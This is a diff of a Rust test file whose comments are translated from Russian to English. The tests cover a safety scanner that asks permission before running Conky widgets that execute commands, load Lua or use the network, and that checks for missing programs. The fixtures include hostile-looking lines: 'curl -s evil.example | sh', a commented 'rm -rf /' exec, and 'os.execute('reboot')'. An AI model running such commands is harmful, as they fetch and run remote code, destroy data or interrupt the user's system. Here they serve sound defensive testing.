@@ -1,11 +1,11 @@
-//! Сверка «опасных директив» виджета Conky (план паритета с Conky Manager,
-//! п.42): перед ПЕРВЫМ запуском виджет, который выполняет команды, грузит
-//! Lua-сценарии или ходит в интернет, спрашивает разрешения; ответ «да»
-//! помнится по отпечатку файлов виджета, и после их правки вопрос
-//! возвращается.
+//! Check of the Conky widget's "dangerous directives" (the parity plan with Conky Manager,
+//! item 42): before the FIRST launch a widget that runs commands, loads
+//! Lua scripts or goes to the internet asks for permission; a "yes" answer
+//! is remembered by the fingerprint of the widget's files, and after they are edited the question
+//! comes back.
 //!
-//! Машина — подставной `LookIo` в памяти: дерево виджетов лежит в словаре,
-//! запись файла разрешений видна сверке.
+//! The machine is a fake in-memory `LookIo`: the widget tree lies in a map,
+//! the write of the permissions file is visible to the check.
 
 mod i18n_pin;
 
@@ -16,10 +16,10 @@ use rexon_core::animations::LookIo;
 use rexon_core::conky_safety::{self as cs, RiskKind};
 use rexon_core::de_apply::Ctx;
 
-/// Файлы машины: путь → содержимое (`None` — двоичный, текстом не читается).
+/// Machine files: path → contents (`None` — binary, not readable as text).
 struct Machine {
     files: RefCell<BTreeMap<String, Option<String>>>,
-    /// Программы, которых нет в PATH.
+    /// Programs that are not in PATH.
     missing: RefCell<Vec<String>>,
 }
 
@@ -76,7 +76,7 @@ fn ctx() -> Ctx {
     Ctx { home: HOME.into(), xdg_config_home: None, wayland: false, de: "mate".into() }
 }
 
-/// Часы без единой команды.
+/// A clock without a single command.
 const CLOCK: &str = r#"conky.config = {
     alignment = 'top_right',
     update_interval = 1,
@@ -87,7 +87,7 @@ ${time %H:%M}
 ]]
 "#;
 
-/// Погода и датчики: команды, сценарий Lua и загрузка из интернета.
+/// Weather and sensors: commands, a Lua script and a download from the internet.
 const WEATHER: &str = r#"conky.config = {
     lua_load = './rings.lua',
     lua_draw_hook_pre = 'main',
@@ -108,7 +108,7 @@ function conky_main()
 end
 "#;
 
-/// Старый синтаксис 1.9: команды после TEXT.
+/// The old 1.9 syntax: commands after TEXT.
 const OLD_SYNTAX: &str = "# старый виджет\n\
 # ${exec rm -rf /} — комментарий\n\
 alignment top_left\n\
@@ -150,7 +150,7 @@ fn scanner_finds_execi_lua_load_and_curl() {
     assert!(has(RiskKind::Command, "playerctl metadata title"), "{risks:#?}");
     assert!(has(RiskKind::LuaScript, "./rings.lua"), "{risks:#?}");
     assert!(has(RiskKind::Network, "https://wttr.in/?format=3"), "{risks:#?}");
-    // Команды из самого сценария Lua — с файлом, где они стоят.
+    // Commands from the Lua script itself — with the file where they are.
     assert!(
         risks.iter().any(|r| r.kind == RiskKind::Command
             && r.what.starts_with("nvidia-smi")
@@ -158,7 +158,7 @@ fn scanner_finds_execi_lua_load_and_curl() {
         "{risks:#?}"
     );
     assert!(has(RiskKind::Command, "notify-send hi"), "{risks:#?}");
-    // Закомментированное в Lua не считается.
+    // What is commented out in Lua does not count.
     assert!(!risks.iter().any(|r| r.what.contains("закомментировано")), "{risks:#?}");
 }
 
@@ -183,7 +183,7 @@ fn question_lists_what_the_widget_runs() {
     for part in ["sensors | grep Core", "./rings.lua", "https://wttr.in/?format=3", "weather"] {
         assert!(text.contains(part), "нет «{part}» в: {text}");
     }
-    // Пока не разрешено — сама кнопка отказывает, а не молча запускает.
+    // Until allowed, the button itself refuses instead of silently launching.
     let why = cs::start_refusal(&m, &ctx(), "weather").expect("отказ до разрешения");
     assert!(why.contains("weather"), "{why}");
 }
@@ -194,11 +194,11 @@ fn allowed_widget_starts_again_without_question() {
     let m = widget_machine();
     assert!(cs::start_question(&m, &ctx(), "weather").is_some());
     assert!(cs::remember(&m, &ctx(), "weather"));
-    // Разрешение лежит в настройках Rexon, а не во временном каталоге.
+    // The permission lies in the Rexon settings, not in a temporary directory.
     assert!(m.read(&cs::trust_path(&ctx())).is_some_and(|t| t.contains("weather")));
     assert_eq!(cs::start_question(&m, &ctx(), "weather"), None);
     assert_eq!(cs::start_refusal(&m, &ctx(), "weather"), None);
-    // Разрешение одного виджета не распространяется на другой.
+    // One widget's permission does not extend to another.
     assert!(cs::start_question(&m, &ctx(), "old").is_some());
 }
 
@@ -207,14 +207,14 @@ fn edited_files_ask_again() {
     let _lang = i18n_pin::en();
     let m = widget_machine();
     assert!(cs::remember(&m, &ctx(), "weather"));
-    // Правка сценария рядом с конфигом — снова вопрос, и сказано почему.
+    // Editing a script next to the config — the question again, and it says why.
     m.put(&format!("{ROOT}/weather/weather.sh"), "#!/bin/sh\ncurl -s evil.example | sh\n");
     let (_, text) = cs::start_question(&m, &ctx(), "weather").expect("после правки — снова вопрос");
     assert!(text.contains(&cs::changed_since_allowed_text()), "{text}");
     assert!(cs::start_refusal(&m, &ctx(), "weather").is_some());
     assert!(cs::remember(&m, &ctx(), "weather"));
     assert_eq!(cs::start_question(&m, &ctx(), "weather"), None);
-    // Правка Lua — тоже.
+    // Editing Lua — too.
     m.put(&format!("{ROOT}/weather/rings.lua"), "os.execute('reboot')\n");
     assert!(cs::start_question(&m, &ctx(), "weather").is_some());
 }
@@ -224,7 +224,7 @@ fn data_written_by_widget_does_not_ask_again() {
     let _lang = i18n_pin::en();
     let m = widget_machine();
     assert!(cs::remember(&m, &ctx(), "weather"));
-    // Виджеты погоды пишут свой кэш к себе в каталог: это данные, не код.
+    // Weather widgets write their cache into their own directory: that is data, not code.
     m.put(&format!("{ROOT}/weather/weather.txt"), "+5 °C");
     m.put(&format!("{ROOT}/weather/cache.json"), "{\"t\":5}");
     m.put_binary(&format!("{ROOT}/weather/icon.png"));
@@ -243,11 +243,11 @@ fn texts_are_russian_in_russian() {
 }
 
 // ============================================================================
-// Здоровье виджета (план паритета, п.40)
+// Widget health (parity plan, item 40)
 // ============================================================================
 
-/// Датчики, видеокарта и погода — с программами, которых нет, и сценариями,
-/// которых нет.
+/// Sensors, the graphics card and weather — with programs that are missing, and scripts
+/// that are missing.
 const SENSORS: &str = r#"conky.config = {
     lua_load = './gone.lua',
 }
@@ -278,18 +278,18 @@ fn health_names_sensors_package_for_each_family() {
             h.missing_programs.contains(&cs::MissingProgram { program: "sensors".into(), package: Some(package.into()), aur: None }),
             "{family}: {h:#?}"
         );
-        // nvidia-smi приходит с драйвером — пакета не предлагаем.
+        // nvidia-smi comes with the driver — we do not offer a package.
         assert!(
             h.missing_programs.contains(&cs::MissingProgram { program: "nvidia-smi".into(), package: None, aur: None }),
             "{family}: {h:#?}"
         );
-        // Есть в PATH, встроенные слова оболочки и присваивания — не программы.
+        // Present in PATH, shell builtins and assignments are not programs.
         let names: Vec<&str> = h.missing_programs.iter().map(|p| p.program.as_str()).collect();
         assert_eq!(names.len(), 2, "{names:?}");
         assert_eq!(h.packages(), vec![package.to_string()]);
         assert_eq!(h.missing_files, vec!["./gone.lua".to_string(), "./missing.sh".to_string()], "{h:#?}");
     }
-    // Незнакомое семейство — программа названа, пакет нет.
+    // An unfamiliar family — the program is named, the package is not.
     let h = cs::health(&m, &ctx(), "sensors", "nix");
     assert!(h.packages().is_empty(), "{h:#?}");
 }
@@ -302,7 +302,7 @@ fn healthy_widget_needs_nothing() {
     assert!(h.is_fine(), "{h:#?}");
     assert_eq!(cs::start_plan("clock", &h, true), cs::StartPlan::Go);
     assert_eq!(cs::files_note(&h), None);
-    // Всё на месте — и у виджета с командами вопроса нет.
+    // Everything is in place — and a widget with commands gets no question either.
     let m = widget_machine();
     m.put(&format!("{ROOT}/weather/rings.lua"), "function conky_main() end\n");
     assert!(cs::health(&m, &ctx(), "weather", "arch").missing_programs.is_empty());
@@ -313,12 +313,12 @@ fn repo_packages_install_without_question_only_where_rexon_can() {
     let _lang = i18n_pin::en();
     let m = sick_machine(&["sensors"]);
     let h = cs::health(&m, &ctx(), "sensors", "arch");
-    // Пакет из репозиториев ставится сам — вопроса «Да/Нет» нет.
+    // A package from the repositories is installed by itself — there is no «Да/Нет» question.
     assert_eq!(cs::start_plan("sensors", &h, true), cs::StartPlan::Install(vec!["lm_sensors".to_string()]));
-    // Недостающие файлы пакетом не поставить — примечанием к итогу.
+    // Missing files cannot be installed with a package — as a note to the result.
     assert!(cs::files_note(&h).is_some_and(|n| n.contains("./gone.lua")));
-    // SteamOS и неизменяемые системы: ставить нельзя — виджет не
-    // запускается, и сказано, что поставить самому.
+    // SteamOS and immutable systems: installing is not allowed — the widget is not
+    // launched, and it says what to install yourself.
     let cs::StartPlan::Refuse(text) = cs::start_plan("sensors", &h, false) else { panic!("должен быть отказ") };
     assert!(text.contains("wasn't started") && text.contains("Install sensors yourself"), "{text}");
 }
@@ -326,8 +326,8 @@ fn repo_packages_install_without_question_only_where_rexon_can() {
 #[test]
 fn program_without_package_refuses_start_without_password() {
     let _lang = i18n_pin::en();
-    // nvidia-smi приходит с драйвером: ставить нечего, а lm_sensors ради
-    // виджета, который всё равно не запустится, пароль не спрашивает.
+    // nvidia-smi comes with the driver: nothing to install, and lm_sensors for a
+    // widget that will not launch anyway does not ask for the password.
     let m = sick_machine(&["sensors", "nvidia-smi"]);
     let h = cs::health(&m, &ctx(), "sensors", "arch");
     let cs::StartPlan::Refuse(text) = cs::start_plan("sensors", &h, true) else { panic!("должен быть отказ") };
@@ -343,8 +343,8 @@ fn canceled_install_refuses_start_and_says_how_to_retry() {
     let m = visualizer_machine();
     let h = cs::health(&m, &ctx(), "eq", "arch");
     assert_eq!(cs::start_plan("eq", &h, true), cs::StartPlan::Install(vec!["cava".to_string()]));
-    // Пароль polkit отменён: виджет НЕ запускается, в итоге — почему и как
-    // поставить ещё раз; причину «пароль не подтверждён» не повторяем.
+    // The polkit password was cancelled: the widget is NOT launched, the result says why and how
+    // to install again; we do not repeat the reason "password not confirmed".
     let canceled = Err(rexon_core::appearance_installer::password_not_confirmed());
     let cs::StartPlan::Refuse(text) = cs::after_install("eq", &h, &h, &canceled) else { panic!("должен быть отказ") };
     assert_eq!(
@@ -352,14 +352,14 @@ fn canceled_install_refuses_start_and_says_how_to_retry() {
         "The widget “eq” wasn't started: without the program cava it doesn't fully work. \
          Press “▶️ Start” again and enter the password to install it."
     );
-    // Ошибка менеджера пакетов — с причиной.
+    // A package manager error — with the reason.
     let cs::StartPlan::Refuse(text) = cs::after_install("eq", &h, &h, &Err("the package manager reported an error".into())) else {
         panic!("должен быть отказ")
     };
     assert!(text.contains("Installation failed: the package manager reported an error."), "{text}");
-    // Встало, и программа на диске — запуск.
+    // Installed, and the program is on disk — launch.
     assert_eq!(cs::after_install("eq", &h, &cs::Health::default(), &Ok(())), cs::StartPlan::Go);
-    // Пакет «встал», а программы нет — не запуск.
+    // The package "installed", but the program is not there — no launch.
     assert!(matches!(cs::after_install("eq", &h, &h, &Ok(())), cs::StartPlan::Refuse(_)));
 }
 
@@ -382,8 +382,8 @@ fn package_table_for_widget_programs() {
     assert_eq!(cs::program_package("sensors", "nix"), None);
 }
 
-/// Эквалайзер вроде Jhalak: команда для `io.popen` собрана из строк в
-/// переменной, программы нет в PATH.
+/// An equalizer like Jhalak: the command for `io.popen` is assembled from strings in
+/// a variable, the program is not in PATH.
 const VISUALIZER: &str = r#"
 local CONFIG_FILE = './cava.conf'
 local function start_cava()
@@ -406,13 +406,13 @@ fn visualizer_machine() -> Machine {
 fn command_built_from_lua_strings_is_shown_and_checked() {
     let _lang = i18n_pin::en();
     let m = visualizer_machine();
-    // В вопросе — сама команда, а не «io.popen(cmd, 'r')».
+    // The question shows the command itself, not "io.popen(cmd, 'r')".
     let risks = cs::scan_widget(&m, &ctx(), "eq");
     assert!(
         risks.iter().any(|r| r.kind == RiskKind::Command && r.what == "cava -p ./cava.conf 2>/dev/null"),
         "{risks:#?}"
     );
-    // Недостающая программа найдена, пакет — из репозиториев семейства.
+    // The missing program is found, the package comes from the family's repositories.
     for family in ["arch", "debian", "fedora", "suse"] {
         let h = cs::health(&m, &ctx(), "eq", family);
         assert_eq!(
@@ -428,8 +428,8 @@ fn command_built_from_lua_strings_is_shown_and_checked() {
 #[test]
 fn aur_only_program_is_named_with_its_aur_package() {
     let _lang = i18n_pin::en();
-    // xdg-terminal-exec в Arch есть только в AUR: Rexon его не ставит, но
-    // говорит, откуда его взять.
+    // xdg-terminal-exec exists in Arch only in AUR: Rexon does not install it, but
+    // says where to get it.
     let m = Machine::new(&[(&format!("{ROOT}/term/conky.conf"), "conky.text = [[ ${exec xdg-terminal-exec htop} ]]\n")]);
     *m.missing.borrow_mut() = vec!["xdg-terminal-exec".to_string()];
     let h = cs::health(&m, &ctx(), "term", "arch");
@@ -437,10 +437,10 @@ fn aur_only_program_is_named_with_its_aur_package() {
         h.missing_programs,
         vec![cs::MissingProgram { program: "xdg-terminal-exec".into(), package: None, aur: Some("xdg-terminal-exec".into()) }]
     );
-    // Пакет только из AUR сам не ставится: сборка из AUR без вопроса
-    // недопустима.
+    // A package only from AUR is not installed by itself: building from AUR without asking
+    // is not allowed.
     assert!(h.packages().is_empty());
-    // Виджет не запускается, и сказано, как поставить из AUR самому.
+    // The widget is not launched, and it says how to install from AUR yourself.
     let cs::StartPlan::Refuse(text) = cs::start_plan("term", &h, true) else { panic!("должен быть отказ") };
     assert_eq!(
         text,
@@ -448,7 +448,7 @@ fn aur_only_program_is_named_with_its_aur_package() {
          xdg-terminal-exec is only in the AUR — install it (for example, yay -S xdg-terminal-exec) and \
          start the widget again."
     );
-    // В Debian пакет есть в репозиториях — про AUR ни слова.
+    // In Debian the package is in the repositories — not a word about AUR.
     let h = cs::health(&m, &ctx(), "term", "debian");
     assert_eq!(h.missing_programs[0].aur, None);
     assert_eq!(cs::program_aur_package("xdg-terminal-exec", "debian"), None);
@@ -484,9 +484,9 @@ fn health_texts_are_russian_in_russian() {
     assert!(cyr(&cs::part_refusal("eq", &h, true).unwrap()));
 }
 
-/// Общий путь «всё или ничего» для набора (и плитки): недостающие пакеты
-/// всех виджетов — одной установкой, без повторов; что не встало или чего
-/// не поставить — этот виджет не запускается, остальные идут.
+/// The common "all or nothing" path for a set (and a tile): the missing packages
+/// of all widgets in one installation, without repeats; whatever did not install or cannot
+/// be installed — that widget is not launched, the rest go.
 #[test]
 fn set_installs_once_and_refuses_only_the_sick_widget() {
     let _lang = i18n_pin::en();
@@ -506,8 +506,8 @@ fn set_installs_once_and_refuses_only_the_sick_widget() {
         Ok(())
     };
     let r = cs::prepare_start(&m, &ctx(), &ids, "arch", true, cs::Retry::Set, &install);
-    // sensors всё равно не запустится (nvidia-smi не поставить) — его
-    // lm_sensors пароль не спрашивает; cava двух эквалайзеров — один раз.
+    // sensors will not launch anyway (nvidia-smi cannot be installed) — its
+    // lm_sensors does not ask for the password; cava of two equalizers — once.
     assert_eq!(*calls.borrow(), [vec!["cava".to_string()]]);
     assert_eq!(r.len(), 4);
     assert_eq!(r[0], Ok(None));
@@ -516,8 +516,8 @@ fn set_installs_once_and_refuses_only_the_sick_widget() {
     assert_eq!(r[2], Ok(None));
     assert_eq!(r[3], Ok(None));
 
-    // Пароль не подтверждён — эквалайзер не запускается, и сказано, что
-    // повторить надо «Применить» набора; часы идут.
+    // The password was not confirmed — the equalizer is not launched, and it says that
+    // the set's «Применить» must be repeated; the clock runs.
     let m = visualizer_machine();
     m.put(&format!("{ROOT}/clock/conky.conf"), CLOCK);
     let canceled = |_: &[String]| Err(rexon_core::appearance_installer::password_not_confirmed());
@@ -530,14 +530,14 @@ fn set_installs_once_and_refuses_only_the_sick_widget() {
             .to_string())
     );
     assert_eq!(r[1], Ok(None));
-    // Ставить нечего — установка не зовётся вовсе.
+    // Nothing to install — the installation is not called at all.
     let never = |_: &[String]| -> Result<(), String> { panic!("установка не нужна") };
     assert_eq!(cs::prepare_start(&m, &ctx(), &["clock".to_string()], "arch", true, cs::Retry::Tile, &never), [Ok(None)]);
 }
 
-/// «Запускать при входе»: при входе виджет запустится без Rexon, поэтому
-/// включение идёт тем же путём «всё или ничего»; отказ подсказывает
-/// включить переключатель ещё раз.
+/// «Запускать при входе»: at login the widget will launch without Rexon, so
+/// enabling goes through the same "all or nothing" path; a refusal suggests
+/// turning the switch on again.
 #[test]
 fn autostart_switch_checks_programs_too() {
     let _lang = i18n_pin::en();
@@ -552,11 +552,11 @@ fn autostart_switch_checks_programs_too() {
     );
 }
 
-/// Сценарий Lua собирает путь к своим файлам от домашнего каталога
+/// A Lua script builds the path to its files from the home directory
 /// (`'${execi 2 bash ' .. HOME .. '/.config/conky/skyrim/scripts/gpu.sh}'`,
-/// виджет skyrim, живая проверка 15.11.2026): файлы на месте — ложного
-/// «нет файлов виджета» нет; путь от неизвестной переменной не проверяется,
-/// а настоящая пропажа под домашним каталогом по-прежнему видна.
+/// the skyrim widget, live check 15.11.2026): the files are in place — no false
+/// "widget files missing"; a path from an unknown variable is not checked,
+/// while a real loss under the home directory is still seen.
 #[test]
 fn lua_paths_from_home_are_not_reported_missing() {
     let _lang = i18n_pin::en();
